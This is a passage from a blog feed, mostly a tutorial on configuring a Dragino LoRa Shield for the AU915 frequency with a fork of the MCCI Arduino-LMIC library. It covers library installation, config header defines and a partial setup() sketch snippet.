&lt;h2 id=&quot;conclusion&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#conclusion&quot; aria-label=&quot;conclusion permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Conclusion&lt;/h2&gt;
&lt;p&gt;This post covered a quick summary of how to restrict SSH access on an Ubuntu Linux 18.04 server. The Restricted SSH package could have a number of uses depending on your specific scenario. If you have any feedback or questions please post a comment below. Thanks!&lt;/p&gt;</content:encoded></item><item><title><![CDATA[Dragino LoraShield on AU915]]></title><description><![CDATA[This post summarizes an updated tutorial on how to configure the Dragino LoRa Shield device for the Australian/New Zealand (AU915) frequency…]]></description><link>https://thomaslaurenson.com/blog/2018-07-21/dragino-lorashield-on-AU915/</link><guid isPermaLink="false">https://thomaslaurenson.com/blog/2018-07-21/dragino-lorashield-on-AU915/</guid><pubDate>Sat, 21 Jul 2018 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;This post summarizes an updated tutorial on how to configure the Dragino LoRa Shield device for the Australian/New Zealand (AU915) frequency using my fork of the MCCI Catena version of the Arduino-LMIC library. &lt;/p&gt;
&lt;h2 id=&quot;contents&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#contents&quot; aria-label=&quot;contents permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Contents&lt;/h2&gt;
&lt;div class=&quot;table-of-contents&quot;&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#background&quot;&gt;Background&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#quickstart&quot;&gt;Quickstart&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#arduino-environment-setup&quot;&gt;Arduino Environment Setup&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#mcci-arduino-lmic-library-configuration&quot;&gt;MCCI Arduino-LMIC Library Configuration&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#sample-dragino-lora-shield-sketch&quot;&gt;Sample Dragino LoRa Shield Sketch&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#conclusion&quot;&gt;Conclusion&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/div&gt;
&lt;h2 id=&quot;background&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#background&quot; aria-label=&quot;background permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Background&lt;/h2&gt;
&lt;p&gt;I recently wrote a post about &lt;a href=&quot;%7B%25%20post_url%202018-07-06-dragino-lorashield-node-configuration-for-AU915%20%25%7D&quot;&gt;Configuring a Dragino LoRa Shield for use on the AU915 frequency&lt;/a&gt; so that the device can be used legally in New Zealand. Specifically, so that the device can operate on the AU915 regional configuration standard. The post linked to one of my GitHub repositories that used a modified version of the original &lt;a href=&quot;https://github.com/matthijskooijman/arduino-lmic&quot;&gt;Arduino-LMIC library&lt;/a&gt;, written by Matthijs Kooijman. However, this library does not support the AU915 frequency out-of-the-box, and my solution was a fork of the original project, followed by quite a &lt;em&gt;hacky&lt;/em&gt; fix to define the AU915 frequency range and channel selection. It works, but is not exactly elegant!&lt;/p&gt;
&lt;p&gt;It seems that there are so many forks of the same &lt;em&gt;Arduino-LMIC&lt;/em&gt; project that finding a reliable and suitable one (for specific devices and frequency requirements) is challenging. I am not complaining about the number of forks, I have a fork of the same library! Well, two now… Nevertheless, I discovered a fork authored by the &lt;a href=&quot;https://github.com/mcci-catena&quot;&gt;MCCI Catena Corporation&lt;/a&gt; on their GitHub site. They had forked it from &lt;a href=&quot;https://github.com/things-nyc&quot;&gt;The Things Network New York&lt;/a&gt;, who forked it from the original Arduino-LMIC library by Matthijs Kooijman. Anyway, the MCCI library appears to be actively developed and provided support for a large number of frequencies (regional configurations), including the well supported EU868 and US915 standards, as well as more recent standardization including AU915, AS923, and IN866. Excellent!&lt;/p&gt;
&lt;p&gt;OK, the interesting part. How can the MCCI &lt;em&gt;Arduino-LMIC&lt;/em&gt; code be modified to run on a different regional configuration? It is relatively straight-forward and they do provide documentation on how to accomplish this task. However, it still took me a while to understand the most basic modifications required to get the code to run on the AU915 standard. The following sections outline the modifications required to use the AU915 configuration on a Dragino LoRa Shield. &lt;/p&gt;
&lt;h4 id=&quot;my-arduino-lmic-library-fork&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#my-arduino-lmic-library-fork&quot; aria-label=&quot;my arduino lmic library fork permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;My Arduino-LMIC Library Fork&lt;/h4&gt;
&lt;p&gt;I have forked the original &lt;a href=&quot;https://github.com/mcci-catena/arduino-lmic&quot;&gt;MCCI Arduino-LMIC library&lt;/a&gt; and pushed updates to my forked version. My forked version has sketches provided for the Dragino LoRa Shield and Adafruit Feather m0 LoRa boards to operate on AU915 sub-band 2. My forked repository is available from:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/thomaslaurenson/arduino-lmic&quot;&gt;thomaslaurenson/arduino-lmic&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Initially, I didn’t want to fork the MCCI Arduino-LMIC library. I feel that there are so many forks, each with changes for: 1) To work on a specific frequency, or 2) To work with a specific device. However, putting all the code in one place seemed like a good solution. The future of my fork will be only to include new sketch files for specific devices or authentication method, and small changes to make the installation process easier for the end-user. I will try to pull updates from MCCI when necessary to keep the fork updated as well. If there is a major problem or changes with the AU915 code, I would rather submit a pull request to the actual MCCI fork of the project - who are doing an excellent job at updating code and fixing community issues. Well done MCCI!&lt;/p&gt;
&lt;h2 id=&quot;quickstart&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#quickstart&quot; aria-label=&quot;quickstart permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Quickstart&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Download and install the Arduino IDE&lt;/li&gt;
&lt;li&gt;Add my fork of the MCCI Arduino-LMIC library to the &lt;em&gt;libraries&lt;/em&gt; directory of your Arduino IDE installation&lt;/li&gt;
&lt;li&gt;&lt;em&gt;Option 1:&lt;/em&gt; Clone the Arduino-LMIC library into the &lt;em&gt;libraries&lt;/em&gt; folder:&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;git clone https://github.com/thomaslaurenson/arduino-lmic.git&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;ul&gt;
&lt;li&gt;&lt;em&gt;Option 2:&lt;/em&gt; Download the ZIP of the repository and use the  &lt;em&gt;Add .ZIP Library…&lt;/em&gt; functionality in the Arduino IDE&lt;/li&gt;
&lt;li&gt;Copy the provided sketch for the Dragino LoRa Shield from the &lt;code class=&quot;language-text&quot;&gt;examples&lt;/code&gt; folder into the Arduino Sketchbook folder&lt;/li&gt;
&lt;li&gt;Open the sketch for your device, change your COM port to the attached device, and &lt;em&gt;Upload&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;Check the &lt;em&gt;Serial Monitor&lt;/em&gt; on baud &lt;code class=&quot;language-text&quot;&gt;115200&lt;/code&gt; to check the device is functioning&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;If you require further information, please continue reading for a full explanation. &lt;/p&gt;
&lt;h2 id=&quot;arduino-environment-setup&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#arduino-environment-setup&quot; aria-label=&quot;arduino environment setup permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Arduino Environment Setup&lt;/h2&gt;
&lt;p&gt;Make sure you have version 1.6.6 (or above) of the Arduino IDE. The documentation for the MCCI Arduino-LMIC library state that this version is required because it requires C99 mode to be enabled by default.&lt;/p&gt;
&lt;p&gt;Now we need to install the Arduino-LMIC library in our Arduino IDE environment. I think the easiest method is to download the GitHub repository as a ZIP file. This can be achieved using the following steps:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Open a web browser and navigate to the &lt;a href=&quot;https://github.com/thomaslaurenson/arduino-lmic&quot;&gt;MCCI Arduino-LMIC library&lt;/a&gt; repository&lt;/li&gt;
&lt;li&gt;Click on the &lt;em&gt;Clone or Download&lt;/em&gt; button&lt;/li&gt;
&lt;li&gt;Select &lt;em&gt;Download ZIP&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;In the Arduino IDE, navigate to &lt;em&gt;Sketch&lt;/em&gt;, &lt;em&gt;Include Library&lt;/em&gt;, &lt;em&gt;Add .ZIP Library…&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;Find the ZIP file, and select &lt;em&gt;Open&lt;/em&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Make sure you have the correct board selected in the Arduino IDE. If you are using the Dragino LoRa Shield, the board needs to be configured as an Arduino Uno (because it is an Arduino Uno shield). Make sure you select the correct board from the &lt;em&gt;Tools&lt;/em&gt;, &lt;em&gt;Board&lt;/em&gt; menu and select &lt;em&gt;Arduino Uno&lt;/em&gt;.&lt;/p&gt;
&lt;h2 id=&quot;mcci-arduino-lmic-library-configuration&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#mcci-arduino-lmic-library-configuration&quot; aria-label=&quot;mcci arduino lmic library configuration permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;MCCI Arduino-LMIC Library Configuration&lt;/h2&gt;
&lt;p&gt;The only modification required to the library itself to use a different frequency is changing the defined regional configuration that the library uses. &lt;strong&gt;This step is not required if you used my forked version of the MCCI Arduino-LMIC library&lt;/strong&gt;, however, I have documented the process I used below to be thorough.&lt;/p&gt;
&lt;p&gt;The regional configuration is set in the &lt;code class=&quot;language-text&quot;&gt;lmic_project_config.h&lt;/code&gt; file - found in the root folder of the library repository. The default value is &lt;code class=&quot;language-text&quot;&gt;#define CFG_us915 1&lt;/code&gt;. To modify this value, and replace it with another regional configuration we need to find and modify the &lt;code class=&quot;language-text&quot;&gt;lmic_project_config.h&lt;/code&gt; file. Depending on how you install the library in the Arduino IDE, how your Arduino IDE is configured, and what operating system you are using… this location may vary. The best method to find it is to determine the location using the Arduino IDE itself. The following steps will determine the location of the &lt;em&gt;Arduino-LMIC&lt;/em&gt; library and change the regional configuration:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;In the Arduino IDE, navigate to &lt;em&gt;File&lt;/em&gt;, &lt;em&gt;Preferences&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;In the &lt;em&gt;Settings&lt;/em&gt; tab, find the value of &lt;em&gt;Sketchbook location&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;Open your file browser (e.g., Windows Explorer, Nautilus)&lt;/li&gt;
&lt;li&gt;Browse to the &lt;em&gt;Sketchbook location&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;There should be a folder called &lt;em&gt;libraries&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;You should find the library here, named: &lt;code class=&quot;language-text&quot;&gt;arduino-lmic-master&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Open the library folder, then open the &lt;code class=&quot;language-text&quot;&gt;project_config&lt;/code&gt; folder&lt;/li&gt;
&lt;li&gt;Open &lt;code class=&quot;language-text&quot;&gt;lmic_project_config.h&lt;/code&gt; in a text editor&lt;/li&gt;
&lt;li&gt;Comment out the &lt;code class=&quot;language-text&quot;&gt;#define CFG_us915 1&lt;/code&gt; line (use a &lt;code class=&quot;language-text&quot;&gt;//&lt;/code&gt;)&lt;/li&gt;
&lt;li&gt;Un-comment any other regional configuration line&lt;/li&gt;
&lt;li&gt;For example: un-comment the  &lt;code class=&quot;language-text&quot;&gt;#define CFG_au921 1&lt;/code&gt; line if you want to use the AU921 configuration&lt;/li&gt;
&lt;li&gt;The final result should look like the code snippet below:&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;&lt;span class=&quot;token comment&quot;&gt;// project-specific definitions&lt;/span&gt;
&lt;span class=&quot;token comment&quot;&gt;//#define CFG_eu868 1&lt;/span&gt;
&lt;span class=&quot;token comment&quot;&gt;//#define CFG_us915 1&lt;/span&gt;
&lt;span class=&quot;token macro property&quot;&gt;&lt;span class=&quot;token directive-hash&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;token directive keyword&quot;&gt;define&lt;/span&gt; &lt;span class=&quot;token macro-name&quot;&gt;CFG_au921&lt;/span&gt; &lt;span class=&quot;token expression&quot;&gt;&lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class=&quot;token comment&quot;&gt;//#define CFG_as923 1&lt;/span&gt;
&lt;span class=&quot;token comment&quot;&gt;//#define LMIC_COUNTRY_CODE LMIC_COUNTRY_CODE_JP    /* for as923-JP */&lt;/span&gt;
&lt;span class=&quot;token comment&quot;&gt;//#define CFG_in866 1&lt;/span&gt;
&lt;span class=&quot;token macro property&quot;&gt;&lt;span class=&quot;token directive-hash&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;token directive keyword&quot;&gt;define&lt;/span&gt; &lt;span class=&quot;token macro-name&quot;&gt;CFG_sx1276_radio&lt;/span&gt; &lt;span class=&quot;token expression&quot;&gt;&lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class=&quot;token comment&quot;&gt;//#define LMIC_USE_INTERRUPTS&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;strong&gt;NOTE:&lt;/strong&gt; It is unusual that the MCCI code refers to the AU915 regional configuration as &lt;em&gt;AU921&lt;/em&gt;. I have never seen the Australian/New Zealand standard referred to using this naming convention. Nevertheless, after reviewing the source code and testing two devices, this is the correct setting for configuring a node for use on the AU915 standard.&lt;/p&gt;
&lt;p&gt;All done! Compared to other libraries this is a very easy modification for AU915/AU921 support. The only other configuration can be done in the actual Arduino sketch, where we can specify that we want to use the AU915/AU921 channel plan and can select a specific sub-band as well. Now, we are ready to modify the default sketch provided in the project.&lt;/p&gt;
&lt;h2 id=&quot;sample-dragino-lora-shield-sketch&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#sample-dragino-lora-shield-sketch&quot; aria-label=&quot;sample dragino lora shield sketch permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Sample Dragino LoRa Shield Sketch&lt;/h2&gt;
&lt;p&gt;Similar to other &lt;em&gt;Arduino-LMIC&lt;/em&gt; forks, and the original version, the MCCI fork is shipped with a collection of example scripts. For someone new to LoRaWAN, it can be very difficult to modify these examples to work with a specific device or frequency. This section discusses a specific sketch file I have authored for the Dragino LoRa Shield (named &lt;code class=&quot;language-text&quot;&gt;ttn-abp-dragino-lorashield-au915.ino&lt;/code&gt;) to operate on the AU915 frequency. The example sketch is located at:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;https://github.com/thomaslaurenson/arduino-lmic/blob/master/examples/ttn-abp-dragino-lorashield-au915/ttn-abp-dragino-lorashield-au915.ino&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;This sketch is based on the original sketch named &lt;code class=&quot;language-text&quot;&gt;ttn-abp.ino&lt;/code&gt; which is for use on The Things Network, using Activation by Personalisation, or ABP. The original example is available from the MCCI GitHub repository using this direct link to the &lt;a href=&quot;https://github.com/mcci-catena/arduino-lmic/blob/master/examples/ttn-abp/ttn-abp.ino&quot;&gt;ttn-abp.ino&lt;/a&gt; file. My sketch is configured for the following:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Configured for AU915 &lt;/li&gt;
&lt;li&gt;Configured for sub-band 2&lt;/li&gt;
&lt;li&gt;Modified pin mapping for Dragino LoRa Shield&lt;/li&gt;
&lt;li&gt;Configured to authenticate using ABP&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&quot;adding-the-example-sketch&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#adding-the-example-sketch&quot; aria-label=&quot;adding the example sketch permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Adding the Example Sketch&lt;/h4&gt;
&lt;p&gt;The example sketch I have authored for the Dragino LoRa Shield is provided in the &lt;code class=&quot;language-text&quot;&gt;examples&lt;/code&gt; directory. The sketch is named:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;ttn-abp-dragino-lorashield-au915.ino&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;There are many ways to get this sketch imported into the Arduino IDE. You can simply open the file from where ever you download the repository. The best method is to add it to the Arduino IDE sketchbook. Make sure to put the sketch (&lt;code class=&quot;language-text&quot;&gt;.ino&lt;/code&gt; file) into a folder with the same name.&lt;/p&gt;
&lt;p&gt;As it is, the sketch is ready to be compiled and uploaded. However, it is prudent to discuss the changes I made to the original sketch and why they were necessary.&lt;/p&gt;
&lt;h4 id=&quot;frequency-operation-definition&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#frequency-operation-definition&quot; aria-label=&quot;frequency operation definition permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Frequency Operation Definition&lt;/h4&gt;
&lt;p&gt;After defining the correct frequency configuration in the &lt;code class=&quot;language-text&quot;&gt;lmic_project_config.h&lt;/code&gt; file, it is set by default in the code. This means any sketch that uses the library will use this frequency. Remember, this was the setting that we configured in the &lt;code class=&quot;language-text&quot;&gt;lmic_project_config.h&lt;/code&gt; file. However, some configuration is still required. I added an else if statement to the existing statements in the &lt;code class=&quot;language-text&quot;&gt;setup&lt;/code&gt; function - which had an existing configuration for the EU868 and US915 frequency plans. However, there was no additional code for the AU915 frequency. &lt;/p&gt;
&lt;p&gt;Specifically, the &lt;code class=&quot;language-text&quot;&gt;setup()&lt;/code&gt; function in the sketch performs a check to see what regional configuration is set in the &lt;em&gt;Arduino-LMIC&lt;/em&gt; code and performs additional configuration; for example, setting specific channels.  A snippet from the original example sketch is provided below for reference. You can see that only the EU868 and US915 frequencies are further configured here.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;setup&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;
    &lt;span class=&quot;token macro property&quot;&gt;&lt;span class=&quot;token directive-hash&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;token directive keyword&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;token expression&quot;&gt;&lt;span class=&quot;token function&quot;&gt;defined&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;CFG_eu868&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;
    &lt;span class=&quot;token function&quot;&gt;LMIC_setupChannel&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;868100000&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;DR_RANGE_MAP&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;DR_SF12&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; DR_SF7&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;  BAND_CENTI&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;      &lt;span class=&quot;token comment&quot;&gt;// g-band&lt;/span&gt;
